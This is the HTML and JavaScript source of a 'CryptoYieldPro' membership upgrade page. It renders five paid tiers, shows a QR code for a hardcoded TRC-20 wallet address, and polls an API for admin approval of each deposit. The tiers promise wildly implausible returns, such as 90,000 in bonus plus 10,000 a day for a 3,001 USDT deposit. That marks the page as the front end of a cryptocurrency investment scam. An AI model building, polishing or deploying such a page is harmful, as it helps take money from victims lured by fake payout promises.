<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Membership Upgrade - CryptoYieldPro</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#040407; --card:#0f0f14; --muted:#9aa3b2; --accent:#a855f7; --accent2:#5eead4;
    --glass: rgba(255,255,255,0.03);
  }
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;background:linear-gradient(180deg,#030305 0%, #07070b 100%);font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:#eaf3ff}
  .wrap{max-width:1100px;margin:28px auto;padding:20px}
  h1{font-size:clamp(1.6rem,4vw,2.2rem); margin:6px 0 18px; background:linear-gradient(90deg,#a855f7,#5eead4); -webkit-background-clip:text; background-clip:text; color:transparent}
  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
  @media(max-width:980px){ .grid{grid-template-columns:repeat(2,1fr)} }
  @media(max-width:640px){ .grid{grid-template-columns:1fr} }

  .card {
    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:18px;
    padding:18px;
    position:relative;
    overflow:hidden;
    border:1px solid rgba(255,255,255,0.04);
    transition:transform .28s cubic-bezier(.2,.9,.3,1), box-shadow .28s;
    cursor:default;
  }
  .card:hover{ transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 50px rgba(0,0,0,0.6) }
  .neon { box-shadow: 0 0 30px rgba(168,85,247,0.08), inset 0 1px 0 rgba(255,255,255,0.02) }
  .titleRow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
  .tier{font-weight:800;font-size:1.35rem}
  .price{font-weight:700;color:#fff}
  .desc{color:var(--muted);font-size:13px;margin-bottom:12px}
  .pill{display:inline-block;padding:6px 10px;border-radius:999px;font-weight:700;font-size:12px}
  .purchase{display:flex;gap:8px;align-items:center;margin-top:auto}
  .btn{
    background:linear-gradient(90deg,var(--accent),var(--accent2));
    border:none;color:#021;padding:10px 12px;border-radius:12px;font-weight:800;cursor:pointer;
    transition:transform .12s;
  }
  .btn:hover{transform:scale(1.03)}
  .ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:8px 10px;border-radius:10px;cursor:pointer}
  .badgelabel{position:absolute;right:12px;top:12px;padding:6px 10px;border-radius:10px;background:linear-gradient(90deg,#ff6fb3,#7c3aed);font-weight:700;color:#fff;font-size:12px}

  .disabledBtn {
    opacity: 0.55;
    pointer-events: none;
    filter: grayscale(0.2);
  }

  /* Modal */
  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);z-index:9999}
  .modal.show{display:flex}
  .modal-card{width:95%;max-width:520px;background:#0b0b0d;padding:20px;border-radius:14px;border:1px solid rgba(255,255,255,0.04)}
  .modal h2{margin:0 0 12px}
  .qr{width:200px;height:200px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:10px auto;overflow:hidden}
  .addr{word-break:break-all;background:#07070b;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);text-align:center}
  .small{font-size:13px;color:var(--muted)}
  .count{font-weight:800;color:var(--accent);margin-top:8px;text-align:center}

  /* membership + wallet boxes */
  .sidebar{margin-top:20px;padding:16px;border-radius:12px;background:linear-gradient(180deg,#07070b,#0d0d10);border:1px solid rgba(255,255,255,0.03)}
  .row{display:flex;justify-content:space-between;gap:8px;align-items:center;margin-top:10px}

  .status {padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);}

  /* subtle animated shine */
  .card::after{content:'';position:absolute;left:-40%;top:-20%;width:60%;height:140%;transform:rotate(25deg);background:linear-gradient(90deg,rgba(255,255,255,0.02),rgba(255,255,255,0.06),rgba(255,255,255,0.02));opacity:0;transition:opacity .45s}
  .card:hover::after{opacity:1}
</style>
</head>
<body>
<div class="wrap">
  <h1>Membership Upgrade</h1>

  <!-- grid of membership cards -->
  <div class="grid" id="tierGrid">
    <!-- cards generated by JS -->
  </div>

  <!-- right side info (mobile stacked) -->
  <div style="margin-top:20px;display:flex;gap:18px;flex-wrap:wrap">
    <div class="sidebar" id="membershipBox" style="flex:1;min-width:280px">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <div class="small">Your Membership</div>
          <div id="memStatus" style="font-weight:800">Loading...</div>
        </div>
        <div id="memBadge" class="pill pending">—</div>
      </div>
      <div id="memDetails" class="small" style="margin-top:10px">—</div>
    </div>

    <div class="sidebar" style="width:320px;min-width:240px">
      <div class="small">Your Wallet</div>
      <div id="wallet" style="font-weight:800;margin-top:6px">Loading...</div>
      <div style="height:10px"></div>
      <div class="small">Quick notes</div>
      <div class="small" style="margin-top:8px;color:var(--muted)">Membership payments are PENDING until admin approves. Once approved, daily payouts start and reflect in your wallet balance.</div>
    </div>
  </div>
</div>

<!-- modal -->
<div id="modal" class="modal" aria-hidden="true">
  <div class="modal-card">
    <button id="closeModal" class="ghost" style="float:right">Close</button>
    <h2 id="modalTitle">Purchase</h2>

    <div style="margin-top:8px">
      <label class="small">Select coin</label>
      <select id="coinSel" style="width:100%;padding:10px;border-radius:10px;margin-top:6px;background:#07070b;border:1px solid rgba(255,255,255,0.03);color:#fff">
        <option value="USDT">USDT (TRC-20)</option>
        <option value="BTC">BTC</option>
        <option value="ETH">ETH</option>
      </select>
    </div>

    <div id="qrArea" style="text-align:center;margin-top:12px">
      <div class="qr" id="qrBox">QR</div>
      <div class="addr small" id="addrBox">Address</div>
      <div class="count small" id="amountBox">Amount: —</div>
    </div>

    <div style="display:flex;gap:8px;margin-top:16px;justify-content:center">
      <button id="createDeposit" class="btn">Purchase Membership</button>
      <button id="checkStatus" class="ghost">Check Status</button>
    </div>

    <div id="txInfo" class="small" style="margin-top:12px"></div>
  </div>
</div>

<script>
/* membership page JS
   - Redirects to login if not logged in
   - Renders cards and handles purchase flow
   - Uses POST /api/deposit and POST /api/verify-payment
   - Implements Option B: one pending membership *per tier*
*/

// ---------- config ----------
const API_BASE = window.location.origin; // works local + prod
const WALLET_ADDR_TRON = "TAx9KbxS2qh7mwafC3VX6gCGJP8tWVaK9R"; // your TRC-20 address

const TIERS = {
  V1: { deposit: 51, daily:10, days:5, bonus:50, label:'V1' },
  V2: { deposit: 1498.5, daily:100, days:7, bonus:3000, label:'V2' },
  V3: { deposit: 3001, daily:10000, days:10, bonus:90000, label:'V3' },
  V4: { deposit: 29998.5, daily:50000, days:15, bonus:300000, label:'V4' },
  V5: { deposit: 50001, daily:75000, days:30, bonus:500000, label:'V5' }
};

// ---------- state ----------
let selectedTier = null;
let pendingTxByTier = {}; // { V1: txId, V2: txId, ... }
let pollTimer = null;
let pollingTier = null;    // which tier's tx we are currently polling

// ---------- DOM ----------
const tierGrid = document.getElementById('tierGrid');
const modal = document.getElementById('modal');
const modalTitle = document.getElementById('modalTitle');
const closeModal = document.getElementById('closeModal');
const coinSel = document.getElementById('coinSel');
const qrBox = document.getElementById('qrBox');
const addrBox = document.getElementById('addrBox');
const amountBox = document.getElementById('amountBox');
const createDepositBtn = document.getElementById('createDeposit');
const checkStatusBtn = document.getElementById('checkStatus');
const txInfo = document.getElementById('txInfo');
const memStatus = document.getElementById('memStatus');
const memDetails = document.getElementById('memDetails');
const memBadge = document.getElementById('memBadge');
const walletEl = document.getElementById('wallet');

// ---------- redirect if not logged in ----------
(async function ensureLogin(){
  try {
    const res = await fetch(`${API_BASE}/api/profile`, { method:'GET', credentials:'include' });
    if (res.status === 401) {
      window.location.href = "login.html";
      return;
    }
    const j = await res.json();
    if (!res.ok) {
      window.location.href = "login.html";
      return;
    }
    // load profile info into UI
    renderProfile(j.user);

    // scan user's transactions (client-side detection): if server returns user.transactions (optional) we can mark pending
    // If your backend offers an endpoint to list user txs, replace this fetch with that endpoint to populate pendingTxByTier on page load.
    // Attempt to fetch /api/user-transactions or /api/transactions if exists (best-effort)
    try {
      const detect = await fetch(`${API_BASE}/api/user-transactions`, { method: 'GET', credentials:'include' });
      if (detect.ok) {
        const d = await detect.json();
        if (d && d.tx) {
          d.tx.forEach(t => {
            if (t.isMembership && t.status === 'PENDING' && t.meta && t.meta.membershipTier) {
              pendingTxByTier[t.meta.membershipTier] = t._id;
            }
          });
        }
      }
    } catch(e){
      // ignore: endpoint probably doesn't exist
    }

    renderCards(); // after populating pending map, render cards so buttons reflect pending state

  } catch (err) {
    window.location.href = "login.html";
  }
})();

// ---------- render tier cards ----------
function renderCards(){
  tierGrid.innerHTML = '';
  const keys = Object.keys(TIERS);
  keys.forEach(k => {
    const t = TIERS[k];
    const div = document.createElement('div');
    div.className = 'card neon';
    // disable purchase button if this tier already has a pending tx
    const hasPending = !!pendingTxByTier[k];
    const disabledClass = hasPending ? 'disabledBtn' : '';
    const pendingNotice = hasPending ? `<div class="small" style="margin-top:8px;color:#facc15">You have a pending payment for ${k}</div>` : '';
    div.innerHTML = `
      <div class="badgelabel">${t.label}</div>
      <div class="titleRow">
        <div class="tier">${t.label}</div>
        <div class="price">${t.deposit.toLocaleString()} USDT</div>
      </div>
      <div class="desc">Daily <strong style="color:#fff">${t.daily.toLocaleString()}</strong> · For <strong>${t.days}</strong> days · Bonus: <strong>${t.bonus.toLocaleString()}</strong></div>
      <div class="desc">Premium membership package with daily payouts. Admin approval required after payment.</div>
      <div class="purchase">
        <button id="buy_${k}" class="btn ${disabledClass}" data-tier="${k}" ${hasPending ? 'disabled' : ''}>Purchase</button>
        <button class="ghost" onclick="showTierInfo('${k}', event)">Details</button>
      </div>
      ${pendingNotice}
    `;
    tierGrid.appendChild(div);

    // attach event
    const buyBtn = div.querySelector(`#buy_${k}`);
    if (buyBtn) buyBtn.addEventListener('click', (ev)=> onPurchaseClick(k, ev));
  });
}

// ---------- Purchase flow ----------
function onPurchaseClick(tier, ev){
  ev.stopPropagation();
  selectedTier = tier;
  const cfg = TIERS[tier];
  modalTitle.innerText = `Purchase ${tier} — Pay ${cfg.deposit} USDT`;
  coinSel.value = 'USDT';
  updateQRandAddr();
  amountBox.innerText = `Amount: ${cfg.deposit} USDT`;
  txInfo.innerText = '';

  // If this tier already has pending tx, inform user and disable create
  if (pendingTxByTier[selectedTier]) {
    currentPendingNotice(`You already have a pending payment for ${selectedTier}. Wait for admin confirmation or decline to make another purchase.`);
    createDepositBtn.classList.add('disabledBtn');
    createDepositBtn.disabled = true;
    modal.classList.add('show');
    return;
  }

  createDepositBtn.classList.remove('disabledBtn');
  createDepositBtn.disabled = false;
  currentPendingNotice('');
  modal.classList.add('show');
}

function showTierInfo(tier, ev){
  ev.stopPropagation();
  const t = TIERS[tier];
  alert(`${tier}\nDeposit: ${t.deposit} USDT\nDaily: ${t.daily} · Days: ${t.days} · Bonus: ${t.bonus}\nAfter payment admin approval required.`);
}

function currentPendingNotice(msg){
  txInfo.innerText = msg || '';
}

// update QR + address display
function updateQRandAddr(){
  const coin = coinSel.value;
  if (coin === 'USDT') {
    // use TRON URI for TRC-20
    const data = `tron:${WALLET_ADDR_TRON}`;
    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data)}`;
    qrBox.innerHTML = `<img src="${qr}" alt="qr" style="width:100%;height:100%;object-fit:contain">`;
    addrBox.innerText = WALLET_ADDR_TRON;
  } else {
    const addr = coin === 'BTC' ? 'Your_BTC_Address' : 'Your_ETH_Address';
    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(coin+':'+addr)}`;
    qrBox.innerHTML = `<img src="${qr}" alt="qr" style="width:100%;height:100%;object-fit:contain">`;
    addrBox.innerText = addr;
  }
}
coinSel.addEventListener('change', updateQRandAddr);

// Close modal
closeModal.addEventListener('click', ()=>{ modal.classList.remove('show'); stopPolling(); });

// Create deposit (sends pending tx to server with isMembership flag)
// === Prevent multiple requests per tier ===
createDepositBtn.addEventListener('click', async ()=>{
  if (!selectedTier) return alert('Select tier');
  // If already has pending for this tier (race-protection), stop
  if (pendingTxByTier[selectedTier]) {
    currentPendingNotice(`You already have a pending payment for ${selectedTier}.`);
    createDepositBtn.disabled = true;
    createDepositBtn.classList.add('disabledBtn');
    return;
  }

  createDepositBtn.disabled = true;
  createDepositBtn.innerText = 'Purchasing...';
  createDepositBtn.classList.add('disabledBtn');

  const coin = coinSel.value || 'USDT';
  const amount = TIERS[selectedTier].deposit;

  try {
    const res = await fetch(`${API_BASE}/api/deposit`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ coin, amount, membershipTier: selectedTier, isMembership: true })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || JSON.stringify(data));

    const txId = data.txId || data.txId?.toString?.() || data.txId;
    // Mark this tier as pending
    pendingTxByTier[selectedTier] = txId;

    // Disable the purchase button for this tier in UI
    const btn = document.querySelector(`#buy_${selectedTier}`);
    if (btn) { btn.disabled = true; btn.classList.add('disabledBtn'); }

    // remember which tier we're polling
    pollingTier = selectedTier;

    txInfo.innerHTML = `Membership purchase started.<br><strong>TxID:</strong> ${txId}.<br>Send exactly <strong>${amount} ${coin}</strong> to the shown address. Wait for admin approval.`;
    // start polling status for this tx
    startPollingFor(txId, selectedTier);

    // re-render cards to show pending status
    renderCards();

  } catch (err) {
    txInfo.innerText = 'Could not create deposit: ' + (err.message || err);
  } finally {
    createDepositBtn.disabled = false;
    createDepositBtn.innerText = 'Purchase Membership';
    // keep button disabled if pending created above
    if (pendingTxByTier[selectedTier]) {
      createDepositBtn.disabled = true;
      createDepositBtn.classList.add('disabledBtn');
    } else {
      createDepositBtn.classList.remove('disabledBtn');
    }
  }
});

// Manual check status button
checkStatusBtn.addEventListener('click', checkStatus);

// Polling for verify-payment (per-tier)
function startPollingFor(txId, tier){
  stopPolling();
  pollingTier = tier;
  pollTimer = setInterval(()=> checkStatus(txId, tier), 8000);
  // run an immediate check too
  checkStatus(txId, tier);
}
function stopPolling(){ if (pollTimer) { clearInterval(pollTimer); pollTimer = null; pollingTier = null; } }

async function checkStatus(txId = null, tier = null){
  // If no txId passed, try to use pollingTier
  if (!txId) {
    if (!pollingTier) return;
    txId = pendingTxByTier[pollingTier];
    tier = pollingTier;
  }
  if (!txId) return;

  try {
    const res = await fetch(`${API_BASE}/api/verify-payment`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ txId })
    });
    const data = await res.json();
    if (!res.ok) {
      txInfo.innerText = 'Status check error: ' + (data.error || JSON.stringify(data));
      return;
    }

    if (data.status === 'CONFIRMED') {
      txInfo.innerHTML = `<span style="color:#7ef6b8;font-weight:800">✓ Payment confirmed by admin for ${tier}</span>`;
      // clear pending lock for this tier
      delete pendingTxByTier[tier];
      stopPolling();
      // re-enable UI and refresh profile to show membership/balance
      renderCards();
      await refreshProfile();
      // close modal after small delay
      setTimeout(()=> modal.classList.remove('show'), 1200);
    } else if (data.status === 'PENDING') {
      txInfo.innerText = `Status: PENDING for ${tier} (waiting for admin)`;
    } else if (data.status === 'DECLINED') {
      txInfo.innerText = `Status: DECLINED by admin for ${tier}`;
      delete pendingTxByTier[tier];
      stopPolling();
      renderCards();
    } else {
      txInfo.innerText = `Status: ${data.status} for ${tier}`;
    }
  } catch (err) {
    txInfo.innerText = 'Could not check status: ' + (err.message || err);
  }
}

// ---------- profile & wallet rendering ----------
async function refreshProfile(){
  try {
    const res = await fetch(`${API_BASE}/api/profile`, { method:'GET', credentials:'include' });
    if (res.status === 401) {
      window.location.href = "login.html";
      return;
    }
    const j = await res.json();
    if (!res.ok) {
      memStatus.innerText = 'Could not load profile';
      walletEl.innerText = '—';
      return;
    }
    renderProfile(j.user);
  } catch (err) {
    memStatus.innerText = 'Error loading profile';
    walletEl.innerText = '—';
  }
}

function renderProfile(user){
  // wallet
  walletEl.innerText = (user.balance || 0).toFixed(2) + ' USD';

  // optionally mark pending from server-provided membership info:
  // If server returns user.membership or transactions with isMembership flags, we would sync those into pendingTxByTier
  if (user.pendingMemberships) {
    // server may return shape: { V1: txId, V2: txId }
    Object.keys(user.pendingMemberships).forEach(k => {
      if (user.pendingMemberships[k]) pendingTxByTier[k] = user.pendingMemberships[k];
    });
    renderCards();
  }

  // membership may be returned in user.membership (server should include)
  const m = user.membership || user.currentMembership || null;
  if (!m) {
    memStatus.innerText = 'No active membership';
    memDetails.innerHTML = 'Purchase a membership on the left. Your membership will appear here once admin approves your deposit.';
    memBadge.innerText = 'NONE';
    memBadge.className = 'pill pending';
    return;
  }
  // display membership info
  memStatus.innerText = `${m.tier || m.membershipTier || 'Member'} — ${m.status || 'ACTIVE'}`;
  memBadge.innerText = (m.status || 'ACTIVE').toUpperCase();
  memBadge.className = 'pill ' + (m.status === 'CONFIRMED' || m.status === 'ACTIVE' ? 'confirmed' : m.status === 'DECLINED' ? 'declined' : 'pending');
  const daysPaid = m.daysPaid || m.paidDays || 0;
  const dur = m.durationDays || m.duration || 0;
  memDetails.innerHTML = `
    Started: ${m.startDate ? new Date(m.startDate).toLocaleString() : '—'} <br/>
    Days paid: ${daysPaid} / ${dur} <br/>
    Daily: ${m.dailyAmount || '-'} USD <br/>
    Bonus paid: ${m.bonusPaid ? 'Yes' : 'No'}
  `;
}

// refresh profile on load
refreshProfile();

// re-render cards in case pendingTxByTier changed
renderCards();

// close modal when clicking outside content
modal.addEventListener('click', (e)=>{ if (e.target === modal) { modal.classList.remove('show'); stopPolling(); } });

</script>
</body>
</html>
